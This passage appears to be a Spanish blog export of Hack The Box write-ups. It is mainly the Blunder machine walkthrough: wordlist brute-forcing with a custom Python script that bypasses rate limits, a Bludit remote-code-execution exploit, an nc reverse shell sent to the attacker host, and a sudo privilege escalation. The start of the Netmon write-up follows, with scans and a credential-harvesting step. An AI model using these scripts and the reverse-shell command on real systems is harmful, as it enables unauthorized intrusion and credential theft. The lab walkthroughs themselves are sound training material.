Payload                                                        =====================================================================000000026:  200    105 L  303 W   3280 Ch    about                                                         000000259:  301    0 L   0 W    0 Ch     admin                                                         000000124:  200    170 L  918 W   7561 Ch    0                                                           000002551:  200    110 L  387 W   3959 Ch    usb                                                          000003295:  200    21 L   171 W   1083 Ch    LICENSE    Despues de unos instantes wfuzz nos reporta rutas validas, en las cuales podemos ver una de admin y si vamos a esa ruta nos redirige a un panel de inicio de sesión.  Ahora vamos a tratar de validar si existe una ruta robots. txt Vemos que efectivamente existe, ahora haciendo un poco de guesing quiero pensar que existen otros archivo con la extensión . txt en las rutas, asi que nuevamente con wfuzz vamos a validar si existen. ❯ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2. 3-medium. txt http://10. 10. 10. 191/FUZZ. txt /usr/lib/python3/dist-packages/wfuzz/__init__. py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information. ********************************************************* Wfuzz 3. 1. 0 - The Web Fuzzer             *********************************************************Target: http://10. 10. 10. 191/FUZZ. txtTotal requests: 220560=====================================================================ID      Response  Lines  Word    Chars    Payload                                                        =====================================================================000001765:  200    1 L   4 W    22 Ch     robots                                                        000002495:  200    4 L   23 W    118 Ch    todo Podemos ver que ademas del robots. txt, existe un archivo todo. txt y si lo visualizamos en el navegador obtenemos un usuario fergus.  Ahora volvamos a el panel de logeo y interceptemos la petición que se realiza con la ayuda de burpsuite y el foxyproxy.  Nos abrimos burpsuite y vemos como se transmite la petición.  Vemos que se envia una petición POST con algunos parametros, incluidos un Token CSRF. Ahora ya que disponemos de un usuario valido podriamos tratar de mediante un ataque de fuerza bruta obtener la contrasena, pero para ello necesitamos usar un diccionario de contraseñas. Anterirmente vimos que la pagina web contenia bastante texto, por que podriamos tratar e hacer un diccionario con las palabras usadas, para ello usaremos la herramienta cewl y al pasarle la ip de la web podemos crearnos un diccionario en base a sus palabras y lo exportaremos en un fichero de nombre dictionary. txt. ❯ cewl -w dictionary. txt http://10. 10. 10. 191CeWL 5. 4. 8 (Inclusion) Robin Wood (robin@digi. ninja) (https://digi. ninja/)❯ ls dictionary. txtAHora que disponemos de un usuario valido fergus y de un diccionario de posibles contraseñas dictionary. txt, podemos crearnos un script en python para automatizar el proceso de fuerza bruta y averiguar la contraseña valida. Llamaremos a nuestro exploit bludit. py. #!/usr/bin/python3from pwn import *import requests, redef def_handler(sig, frame):  print( \n[!]Saliendo. . . !\n )  sys. exit(1)#ctrl_csignal. signal(signal. SIGINT, def_handler)#variables_globalesmain_url =  http://10. 10. 10. 191/admin/ def makeRequests():  s = requests. session()  passwords = open( dictionary. txt , 'r')  p1 = log. progress( Fuerza Bruta )  p1. status( Iniciando proceso de Fuerza Bruta )  time. sleep(2)  counter = 1  for password in passwords. readlines():        password = password. strip('\n')        p1. status( Probando con la password [%d/349]: %s  % (counter, password))    r = s. get(main_url)    tokenCSRF = re. findall(r'name= tokenCSRF  value= (. *?) ', r. text)[0]    post_data = {         tokenCSRF : tokenCSRF,         username :  fergus ,         password : password,         save : ''    }    r = s. post(main_url, data=post_data)    counter += 1    if  Username or password incorrect  not in r. text:      p1. success( La contraseña es %s  % password)      sys. exit(0)if __name__=='__main__':  makeRequests()Ejecutamos el exploit y despues de unos segundos nos valida que la contraseña es: King ❯ python3 prueba. py[+] Fuerza Bruta: La contraseña es KingProbamos a logearnos en el servicio y vemos que las credenciales son incorrectas, ademas vemos un mensaje que nos dice que nuestra ip fue bloqueada.  Investigando un poco vemos que existe una forma de bypasear el uso de fuerza bruta en Bludit, atraves de la cabezera X-Forwarded-For.  https://rastating. github. io/bludit-brute-force-mitigation-bypass/Modificamos nuestro exploit y añadismos la cabezera X-Forwarded-For, con el valor de nuestra variable password, aprovechando que este por cada iteración sera aleatorio, #!/usr/bin/python3from pwn import *import requests, redef def_handler(sig, frame):  print( \n[!]Saliendo. . . !\n )  sys. exit(1)#ctrl_csignal. signal(signal. SIGINT, def_handler)#variables_globalesmain_url =  http://10. 10. 10. 191/admin/ def makeRequests():  s = requests. session()  passwords = open( dictionary. txt , 'r')  p1 = log. progress( Fuerza Bruta )  p1. status( Iniciando proceso de Fuerza Bruta )  time. sleep(2)  counter = 1  for password in passwords. readlines():        password = password. strip('\n')        p1. status( Probando con la paassword [%d / 349] %s  % (counter, password))    r = s. get(main_url)    tokenCSRF = re. findall(r'name= tokenCSRF  value= (. *?) ', r. text)[0]    post_data = {         tokenCSRF : tokenCSRF,         username :  fergus ,         password : password,         save : ''    }    myHeaders = {      'X-Forwarded-For': password    }    r = s. post(main_url, data=post_data, headers=myHeaders)    counter += 1    if  Username or password incorrect  not in r. text:      p1. success( La contraseña es %s  % password)      sys. exit(0)if __name__=='__main__':  makeRequests()Despues de unos instantes logramos obtener la contraseña del usuario fergus:RolandDeschain. ❯ python3 bludit. py[. ] Fuerza Bruta: Probando con la password the[+] Fuerza Bruta: La contraseña es RolandDeschainValidamos la contraseña en la pagina de logeo y ganamos acceso a un panel de dashboard.  Si ahora buscamos vulnerabilidades asociadas a bludit, encontramos un exploit en python asociado Directory Traversal que deriva en ejecución remota de comandos. ❯ searchsploit bludit----------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                    | Path----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Bludit - Directory Traversal Image File Upload (Metasploit)                                             | php/remote/47699. rbBludit 3. 13. 1 - 'username' Cross Site Scripting (XSS)                                                | php/webapps/50529. txtBludit 3. 9. 12 - Directory Traversal                                                         | php/webapps/48568. pyBludit 3. 9. 2 - Auth Bruteforce Bypass                                                        | php/webapps/48942. pyBludit 3. 9. 2 - Authentication Bruteforce Bypass (Metasploit)                                             | php/webapps/49037. rbBludit 3. 9. 2 - Authentication Bruteforce Mitigation Bypass                                              | php/webapps/48746. rbBludit 3. 9. 2 - Directory Traversal                                                          | multiple/webapps/48701. txtbludit Pages Editor 3. 0. 0 - Arbitrary File Upload                                                  | php/webapps/46060. txt----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No ResultsPapers: No ResultsNos traemos el exploit y al ejecutarlo nos pide algunos parametros ❯ searchsploit -m php/webapps/48568. py Exploit: Bludit 3. 9. 12 - Directory Traversal   URL: https://www. exploit-db. com/exploits/48568   Path: /usr/share/exploitdb/exploits/php/webapps/48568. pyFile Type: Python script, ASCII text executable, with very long linesCopied to: /home/fmiracle/Git/firtsmiracle. github. io/assets/images/HTB/htb-writeup-Blunder/48568. py❯ mv 48568. py exploit_bludit. py❯ python3 exploit_bludit. py╔╗ ┬ ┬ ┬┌┬┐┬┌┬┐ ╔═╗╦ ╦╔╗╔╠╩╗│ │ │ │││ │  ╠═╝║║║║║║╚═╝┴─┘└─┘─┴┘┴ ┴  ╩ ╚╩╝╝╚╝ CVE-2019-16113 CyberVacausage: exploit_bludit. py [-h] -u URL -user USER -pass PASSWORD -c COMMANDexploit_bludit. py: error: the following arguments are required: -u, -user, -pass, -cEjecutamos el exploit con los parametros correspondientes y con -c especificamos el comandos que deseamos ejecutar, para ello probaremos enviarnos una traza a nuestra maquina. ❯ python3 exploit_bludit. py -u http://10. 10. 10. 191 -user fergus -pass RolandDeschain -c 'ping 10. 10. 16. 4'╔╗ ┬ ┬ ┬┌┬┐┬┌┬┐ ╔═╗╦ ╦╔╗╔╠╩╗│ │ │ │││ │  ╠═╝║║║║║║╚═╝┴─┘└─┘─┴┘┴ ┴  ╩ ╚╩╝╝╚╝ CVE-2019-16113 CyberVaca[+] csrf_token: 56c6bb6a8ba8cb234b81e3fc60794fa537f591c6[+] cookie: tg456638i906rknr4n27it5kr3[+] csrf_token: 0208621fe6b05f215d6f16a7675200b78af3cd2b[+] Uploading tdbdwfqf. jpg[+] Executing command: ping 10. 10. 16. 4[+] Delete: . htaccess[+] Delete: tdbdwfqf. jpgy vemos que recibimos la traza en nuestro equipo. ❯ tcpdump -i tun0 icmp -ntcpdump: verbose output suppressed, use -v[v]. . . for full protocol decodelistening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes20:48:34. 774870 IP 10. 10. 10. 191 &gt; 10. 10. 16. 4: ICMP echo request, id 4083, seq 1, length 6420:48:34. 774896 IP 10. 10. 16. 4 &gt; 10. 10. 10. 191: ICMP echo reply, id 4083, seq 1, length 6420:48:35. 702537 IP 10. 10. 10. 191 &gt; 10. 10. 16. 4: ICMP echo request, id 4083, seq 2, length 6420:48:35. 702583 IP 10. 10. 16. 4 &gt; 10. 10. 10. 191: ICMP echo reply, id 4083, seq 2, length 6420:48:36. 774871 IP 10. 10. 10. 191 &gt; 10. 10. 16. 4: ICMP echo request, id 4083, seq 3, length 6420:48:36. 774913 IP 10. 10. 16. 4 &gt; 10. 10. 10. 191: ICMP echo reply, id 4083, seq 3, length 6420:48:37. 615149 IP 10. 10. 10. 191 &gt; 10. 10. 16. 4: ICMP echo request, id 4083, seq 4, length 6420:48:37. 615194 IP 10. 10. 16. 4 &gt; 10. 10. 10. 191: ICMP echo reply, id 4083, seq 4, length 64Lo siguiente sera mandaremos una reverse shell con la versión antigua de ntcat haciendo uso de mkfifo a nuestra maquina. ❯ python3 exploit_bludit. py -u http://10. 10. 10. 191 -user fergus -pass RolandDeschain -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10. 10. 16. 4 443 &gt;/tmp/f'╔╗ ┬ ┬ ┬┌┬┐┬┌┬┐ ╔═╗╦ ╦╔╗╔╠╩╗│ │ │ │││ │  ╠═╝║║║║║║╚═╝┴─┘└─┘─┴┘┴ ┴  ╩ ╚╩╝╝╚╝ CVE-2019-16113 CyberVaca[+] csrf_token: cc25e735f2604125be5c2142412dbe2253a33fea[+] cookie: a8c95lrdmos65m0545e9fflgh4[+] csrf_token: 0f6fc1b9b0455869059adf72375ddcb9cef563bb[+] Uploading rubnxlev. jpg[+] Executing command: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10. 10. 16. 4 443 &gt;/tmp/f[+] Delete: . htaccess[+] Delete: rubnxlev. jpgY obtenemos acceso como el usuario www-data ❯ ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 10. 191. Ncat: Connection from 10. 10. 10. 191:47166. /bin/sh: 0: can't access tty; job control turned off$ whoamiwww-dataComo de constumbre vamos a otorgarnos una tty full interactive. $ script /dev/null -c bashScript started, file is /dev/nullwww-data@blunder:/var/www/bludit-3. 9. 2/bl-content/tmp$ ^Zzsh: suspended ncat -nlvp 443❯ stty raw -echo; fg[1] + continued ncat -nlvp 443                reset xtermwww-data@blunder:/var/www/bludit-3. 9. 2/bl-content/tmp$ export TERM=xtermwww-data@blunder:/var/www/bludit-3. 9. 2/bl-content/tmp$ export SHELL=bashwww-data@blunder:/var/www/bludit-3. 9. 2/bl-content/tmp$ stty rows 45 columns 184Enumerando el sistema dentro en el directorio bludit-3-10-0a, encontramos el archivo users. php con un password en hash que podemos tratar de crackear. www-data@blunder:/var/www/bludit-3. 10. 0a/bl-content/databases$ cat users. php &lt;?php defined('BLUDIT') or die('Bludit CMS. '); ?&gt;{   admin : {     nickname :  Hugo ,     firstName :  Hugo ,     lastName :   ,     role :  User ,     password :  faca404fd5c0a31cf1897b823c695c85cffeb98d ,     email :   ,     registered :  2019-11-27 07:40:55 ,     tokenRemember :   ,     tokenAuth :  b380cb62057e9da47afce66b4615107d ,     tokenAuthTTL :  2009-03-15 14:00 ,     twitter :   ,     facebook :   ,     instagram :   ,     codepen :   ,     linkedin :   ,     github :   ,     gitlab :   }}Para ello usaremos nuestro web de confianza y logramos decifrar la contraseña la cual es Password120  https://crackstation. net/Con la nueva credencial migramos exitosamente como el usuario hugo, nos dirigimos a su directorio personal y visualizamos la primera flag user. txt. www-data@blunder:/var/www/bludit-3. 10. 0a/bl-content/databases$ su hugoPassword: hugo@blunder:/var/www/bludit-3. 10. 0a/bl-content/databases$ whoamihugohugo@blunder:/var/www/bludit-3. 10. 0a/bl-content/databases$ cd /home/hugo/hugo@blunder:~$ lsDesktop Documents Downloads Music Pictures Public Templates user. txt Videoshugo@blunder:~$ cat user. txt 0ad6d2d9c835f7f10ba8518d29dedc4bEscalada de Privilegios #: Enumerando los privilegios a nivel de sudoers, vemos que el usario hugo, puede ejecutar una bash como cualquier usuario a exepción de root. Aprovechando esto podemos migrar al usuario shaun. hugo@blunder:~$ sudo -u shaun bashshaun@blunder:/home/hugo$ whoamishaunshaun@blunder:/home/hugo$ iduid=1000(shaun) gid=1000(shaun) groups=1000(shaun),4(adm),24(cdrom),30(dip),46(plugdev),119(lpadmin),130(lxd),131(sambashare)Vemos que el usuario shaun,se encuntra en el grupo lxd, asi que podriamos aprovecharnos de eso para convertirnos en root, pero en esta ocasión vamos a realizarlo de otra manera ya que si vemos la version de sudo que se esta empleando corresponde a una vulnerable. shaun@blunder:/home/hugo$ sudo --versionSudo version 1. 8. 25p1Sudoers policy plugin version 1. 8. 25p1Sudoers file grammar version 46Sudoers I/O plugin version 1. 8. 25p1Buscando un exploit publico encontramos uno referente a security bypass y para versiones menores a la 1. 8. 27, al ser esta una versión menor podemos usar este exploit. ❯ searchsploit sudo 1. 8. ----------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                    | Path----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------sudo 1. 8. 0 &lt; 1. 8. 3p1 - 'sudo_debug' glibc FORTIFY_SOURCE Bypass + Privilege Escalation                                | linux/local/25134. csudo 1. 8. 0 &lt; 1. 8. 3p1 - Format String                                                         | linux/dos/18436. txtSudo 1. 8. 14 (RHEL 5/6/7 / Ubuntu) - 'Sudoedit' Unauthorized Privilege Escalation                                   | linux/local/37710. txtSudo 1. 8. 20 - 'get_process_ttyname()' Local Privilege Escalation                                           | linux/local/42183. cSudo 1. 8. 25p - 'pwfeedback' Buffer Overflow                                                     | linux/local/48052. shSudo 1. 8. 25p - 'pwfeedback' Buffer Overflow (PoC)                                                  | linux/dos/47995. txtsudo 1. 8. 27 - Security Bypass                                                            | linux/local/47502. py----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Revisamos el codigo del exploit y vemos que solo tenemos que ejecutar la siguiente instrucción sudo -u#-1 /bin/bash, pero debemos hacerlo como el usuario hugo ya que este tenia el privilegio a nivel de sudoers. Una vez ya como el ususario root nos dirigimos a su directorio personal y visualizamos la segunda flag root. txt. hugo@blunder:~$ sudo -u#-1 /bin/bashroot@blunder:/home/hugo# whoamirootroot@blunder:/home/hugo# cd /rootroot@blunder:/root# cat root. txt dd6d458838b1d2c778b789eeb79ab063"
    }, {
    "id": 30,
    "url": "http://localhost:4000/hackthebox/htb-writeup-Netmon",
    "title": "Maquina Netmon - htb writeup",
    "body": "2023/06/13 - Hoy vamos a resolver la máquina Netmon de la plataforma de hackthebox correspondiente a una maquina windows dificultad facil, la cual explotaremos a partir de una enumeración por ftp donde obtendremos archivos de configuración con credenciales que nos permitiran conectarnos al servicio web y despues nos aprovecharemos de una vulnerabilidad de PRTG que nos permitira realizar la creación de un usuario a nivel de sistema y le añadiremos permisis de administrador, para finalmente conectarnos al sistema como el usuario administrator. Vamos a comenzar creando un directorio con el nombre de la maquina: ❯ mkdir Netmon❯ ls NetmonSeguidamente con la funcion mkt crearemos nuestros directorios de trabajo: ❯ which mktmkt () {	mkdir {nmap,content,exploits,scripts}}❯ mkt❯ ls content  exploits  nmap  scriptsEnumeración #: Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando ping: ❯ ping -c 1 10. 10. 10. 152PING 10. 10. 10. 152 (10. 10. 10. 152) 56(84) bytes of data. 64 bytes from 10. 10. 10. 152: icmp_seq=1 ttl=127 time=200 ms--- 10. 10. 10. 152 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 199. 775/199. 775/199. 775/0. 000 msVemos que la maquina nos responde, con un ttl de 127correspondiente a una maquina windows, ahora procederemos a el escaneo de puertos con la ayuda de nmap: Escaneo de Puertos:       Parámetro   Descripción         -p-   Escaneamos todos los 65535 puertos.        –open   Solo los puertos que estén abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para que mediante una funcion de S4vitar nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles   Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre openPorts: ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10. 10. 10. 152 -oG openPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 92 ( https://nmap. org ) at 2023-06-14 04:18 GMTInitiating SYN Stealth Scan at 04:18Scanning 10. 10. 10. 152 [65535 ports]Discovered open port 80/tcp on 10. 10. 10. 152Discovered open port 21/tcp on 10. 10. 10. 152Discovered open port 135/tcp on 10. 10. 10. 152Discovered open port 139/tcp on 10. 10. 10. 152Discovered open port 445/tcp on 10. 10. 10. 152Discovered open port 49667/tcp on 10. 10. 10. 152Discovered open port 49664/tcp on 10. 10. 10. 152Discovered open port 49668/tcp on 10. 10. 10. 152Discovered open port 47001/tcp on 10. 10. 10. 152Discovered open port 49666/tcp on 10. 10. 10. 152Discovered open port 49669/tcp on 10. 10. 10. 152Discovered open port 5985/tcp on 10. 10. 10. 152Discovered open port 49665/tcp on 10. 10. 10. 152Completed SYN Stealth Scan at 04:18, 23. 62s elapsed (65535 total ports)Nmap scan report for 10. 10. 10. 152Host is up, received user-set (0. 14s latency). Scanned at 2023-06-14 04:18:22 GMT for 24sNot shown: 63185 closed tcp ports (reset), 2337 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE   REASON21/tcp  open ftp     syn-ack ttl 12780/tcp  open http     syn-ack ttl 127135/tcp  open msrpc    syn-ack ttl 127139/tcp  open netbios-ssn syn-ack ttl 127445/tcp  open microsoft-ds syn-ack ttl 1275985/tcp open wsman    syn-ack ttl 12747001/tcp open winrm    syn-ack ttl 12749664/tcp open unknown   syn-ack ttl 12749665/tcp open unknown   syn-ack ttl 12749666/tcp open unknown   syn-ack ttl 12749667/tcp open unknown   syn-ack ttl 12749668/tcp open unknown   syn-ack ttl 12749669/tcp open unknown   syn-ack ttl 127Read data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 23. 76 seconds      Raw packets sent: 116389 (5. 121MB) | Rcvd: 77893 (3. 116MB)Escaneo de Version y Servicios. : ❯ nmap -sCV -p21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 10. 10. 10. 152 -oN targetedStarting Nmap 7. 92 ( https://nmap. org ) at 2023-06-14 04:19 GMTNmap scan report for 10. 10. 10. 152Host is up (0. 40s latency). PORT   STATE SERVICE   VERSION21/tcp  open ftp     Microsoft ftpd| ftp-anon: Anonymous FTP login allowed (FTP code 230)| 02-03-19 12:18AM         1024 . rnd| 02-25-19 10:15PM    &lt;DIR&gt;     inetpub| 07-16-16 09:18AM    &lt;DIR&gt;     PerfLogs| 02-25-19 10:56PM    &lt;DIR&gt;     Program Files| 02-03-19 12:28AM    &lt;DIR&gt;     Program Files (x86)| 02-03-19 08:08AM    &lt;DIR&gt;     Users|_02-25-19 11:49PM    &lt;DIR&gt;     Windows| ftp-syst: |_ SYST: Windows_NT80/tcp  open http     Indy httpd 18. 1. 37. 13946 (Paessler PRTG bandwidth monitor)|_http-server-header: PRTG/18. 1. 37. 13946| http-title: Welcome | PRTG Network Monitor (NETMON)|_Requested resource was /index. htm|_http-trane-info: Problem with XML parsing of /evox/about135/tcp  open msrpc    Microsoft Windows RPC139/tcp  open netbios-ssn Microsoft Windows netbios-ssn445/tcp  open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds5985/tcp open http     Microsoft HTTPAPI httpd 2. 0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2. 0|_http-title: Not Found47001/tcp open http     Microsoft HTTPAPI httpd 2. 0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2. 0|_http-title: Not Found49664/tcp open msrpc    Microsoft Windows RPC49665/tcp open msrpc    Microsoft Windows RPC49666/tcp open msrpc    Microsoft Windows RPC49667/tcp open msrpc    Microsoft Windows RPC49668/tcp open msrpc    Microsoft Windows RPC49669/tcp open msrpc    Microsoft Windows RPCService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsHost script results:| smb-security-mode: |  authentication_level: user|  challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: |  3. 1. 1: |_  Message signing enabled but not required| smb2-time: |  date: 2023-06-14T04:20:28|_ start_date: 2023-06-14T04:14:56Service detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 77. 25 secondsVisulizamos informacion interesante de los puertos escaneados:       Puerto   Servicio   Versión         21   FTP   Microsoft ftpd       80   HTTP   Indy httpd 18. 1. 37. 13946       135   RPC   Microsoft Windows RPC       139   LDAP   Microsoft Windows netbios-ssn       445   SMP   Microsoft Windows Server 2008 R2 - 2012 microsoft-ds       5985   WINRM   Microsoft HTTPAPI httpd 2. 0 (SSDP/UPnP)       47001   HTTP   Microsoft HTTPAPI httpd 2. 0       49664-49669   MSRPC   Microsoft Windows RPC   Explotación #: Comenzaremos enumerando el servicio ftp haciendo uno del usuario anonymous, sin proporcionar contraseña. ❯ ftp 10. 10. 10. 152Connected to 10. 10. 10. 152. 220 Microsoft FTP ServiceName (10. 10. 10. 152:fmiracle): anonymous331 Anonymous access allowed, send identity (e-mail name) as password. Password:230 User logged in. Remote system type is Windows_NT. ftp&gt; dir200 PORT command successful. 125 Data connection already open; Transfer starting. 02-03-19 12:18AM         1024 . rnd02-25-19 10:15PM    &lt;DIR&gt;     inetpub07-16-16 09:18AM    &lt;DIR&gt;     PerfLogs02-25-19 10:56PM    &lt;DIR&gt;     Program Files02-03-19 12:28AM    &lt;DIR&gt;     Program Files (x86)02-03-19 08:08AM    &lt;DIR&gt;     Users02-25-19 11:49PM    &lt;DIR&gt;     Windows226 Transfer complete. Si nos dirigimos al directorio Users, vemos que podemos obtener la primera flag user. txt, pero aun no tenemos acceso al sistema. ftp&gt; cd Users250 CWD command successful. ftp&gt; dir200 PORT command successful. 125 Data connection already open; Transfer starting. 02-25-19 11:44PM    &lt;DIR&gt;     Administrator02-03-19 12:35AM    &lt;DIR&gt;     Public226 Transfer complete. ftp&gt; cd Public250 CWD command successful. ftp&gt; dir200 PORT command successful. 125 Data connection already open; Transfer starting. 02-03-19 08:05AM    &lt;DIR&gt;     Documents07-16-16 09:18AM    &lt;DIR&gt;     Downloads07-16-16 09:18AM    &lt;DIR&gt;     Music07-16-16 09:18AM    &lt;DIR&gt;     Pictures06-14-23 12:15AM          34 user. txt07-16-16 09:18AM    &lt;DIR&gt;     Videos226 Transfer complete. ftp&gt; get user. txtlocal: user. txt remote: user. txt200 PORT command successful. 150 Opening ASCII mode data connection. 226 Transfer complete. 34 bytes received in 0. 20 secs (0. 1620 kB/s)ftp&gt; exit221 Goodbye. ❯ cat user. txt❯ c07be14afc2253b24510769dcb7db65Para poder enumear de una manera mas comoda los archivos mediante ftp, vamos a crearnos una montura con la herramienta curlftpfs. ❯ curlftpfs❯ mkdir /mnt/monturaftp❯ curlftpfs ftp://10. 10. 10. 152 /mnt/monturaftp❯ ls -l /mnt/monturaftpd--------- root root  0 B Sun Nov 20 22:46:00 2016  $RECYCLE. BINd--------- root root  0 B Sun Feb 3 08:05:00 2019  Documents and Settingsd--------- root root  0 B Mon Feb 25 22:15:00 2019  inetpubd--------- root root  0 B Sat Jul 16 09:18:00 2016  PerfLogsd--------- root root  0 B Mon Feb 25 22:56:00 2019  Program Filesd--------- root root  0 B Sun Feb 3 00:28:00 2019  Program Files (x86)d--------- root root  0 B Wed Dec 15 10:40:00 2021  ProgramDatad--------- root root  0 B Sun Feb 3 08:05:00 2019  Recoveryd--------- root root  0 B Sun Feb 3 08:04:00 2019  System Volume Informationd--------- root root  0 B Sun Feb 3 08:08:00 2019  Usersd--------- root root  0 B Mon Feb 25 23:49:00 2019  Windows. --------- root root 380 KB Sun Nov 20 21:59:00 2016  bootmgr. --------- root root  1 B Sat Jul 16 09:10:00 2016  BOOTNXT. --------- root root 704 MB Wed Jun 14 00:14:00 2023  pagefile. sysAntes de segui enumerando vamos a ver el servicio web, que esta expuesto en el puerto 80.  Vemos que el servicio corresponde a PRTG Network Monitor.  PRTG Network Monitor: PRTG (Paessler Router Traffic Grapher hasta la versión 7) es un software de monitoreo de red sin agentes de Paessler AG. El término general Paessler PRTG aúna varias versiones de software capaces de monitorizar y clasificar diferentes condiciones del sistema, como el uso del ancho de banda o el tiempo de actividad, y recopilar estadísticas de diversos anfitriones como switches, routers, servidores y otros dispositivos y aplicaciones. Buscamos si hay exploits asociados a este servicio y entre ellos una de ejecución remota de comandos. ❯ searchsploit PRTG----------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                    | Path----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------PRTG Network Monitor 18. 2. 38 - (Authenticated) Remote Code Execution                                         | windows/webapps/46527. shPRTG Network Monitor 20. 4. 63. 1412 - 'maps' Stored XSS                                                | windows/webapps/49156. txtPRTG Network Monitor &lt; 18. 1. 39. 1648 - Stack Overflow (Denial of Service)                                       | windows_x86/dos/44500. pyPRTG Traffic Grapher 6. 2. 1 - 'url' Cross-Site Scripting                                               | java/webapps/34108. txt----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No ResultsPapers: No ResultsEl exploit nos pide estar autenticados, asi que vamos a examinar la montura que previamente creamos y trataremos de buscar archivos de configuración, ya que estos suelen almacenar credenciales. Encontramos archivos de configuración, y usaremos diff para encontrar diferncias entre el archivo . dat y el archivo old. bak diff  PRTG Configuration. dat   PRTG Configuration. old. bak  | less&lt;        &lt;flags&gt;&lt;         &lt;encrypted/&gt;&lt;        &lt;/flags&gt;---&gt;       &lt;!-- User: prtgadmin --&gt;&gt;       PrTg@dmin2018317c313&lt;         77RULO2GA4Q3RVEUZ77IMPLVKABRRS2UNR3Q====---&gt;         6SLJOGVBYWJF5ZMURQWHEPJ3C3WT2NQDJOZA====325c321&lt;         IVK3MVDI6HCMYIRYQN264YLIRXNJWMB6NT3Q====---&gt;         ILD5YN3TROUJXG6ECLVDRKIPKTBKE274FTNQ====Obtenemos las credenciales prtgadmin:PrTg@dmin2018 con las cuales podamos logearnos en el servicio PRTG, pero al intentar logearnos nos dicen que las credenciales son invalidas.  Podemos tratar de hacer guesing y debido a que la contraseña termina en 2018, podemos modificarla por 2019.  Logramos conectarnos al panel como el usuario administrator.  Escalada de Privilegios #: Si revisamos el exploit que tenemos, vemos que este realiza una petición a la ruta myaccount. htm?tabid=2 y envia una data que se encuentra urlencodeada.  Usaremos una sesión interactiva de php para urldecodear la data y ver mejor que es lo que envia. ❯ php --interactiveInteractive mode enabledphp &gt; echo urldecode( name_=create_user&amp;tags_=&amp;active_=1&amp;schedule_=-1%7CNone%7C&amp;postpone_=1&amp;comments=&amp;summode_=2&amp;summarysubject_=%5B%25sitename%5D+%25summarycount+Summarized+Notifications&amp;summinutes_=1&amp;accessrights_=1&amp;accessrights_=1&amp;accessrights_201=0&amp;active_1=0&amp;addressuserid_1=-1&amp;addressgroupid_1=-1&amp;address_1=&amp;subject_1=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;contenttype_1=text%2Fhtml&amp;customtext_1=&amp;priority_1=0&amp;active_17=0&amp;addressuserid_17=-1&amp;addressgroupid_17=-1&amp;message_17=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;active_8=0&amp;addressuserid_8=-1&amp;addressgroupid_8=-1&amp;address_8=&amp;message_8=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;active_2=0&amp;eventlogfile_2=application&amp;sender_2=PRTG+Network+Monitor&amp;eventtype_2=error&amp;message_2=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;active_13=0&amp;sysloghost_13=&amp;syslogport_13=514&amp;syslogfacility_13=1&amp;syslogencoding_13=1&amp;message_13=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;active_14=0&amp;snmphost_14=&amp;snmpport_14=162&amp;snmpcommunity_14=&amp;snmptrapspec_14=0&amp;messageid_14=0&amp;message_14=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;senderip_14=&amp;active_9=0&amp;url_9=&amp;urlsniselect_9=0&amp;urlsniname_9=&amp;postdata_9=&amp;active_10=0&amp;active_10=10&amp;address_10=Demo+EXE+Notification+-+OutFile. ps1&amp;message_10=%22C%3A%5CUsers%5CPublic%5Ctester. 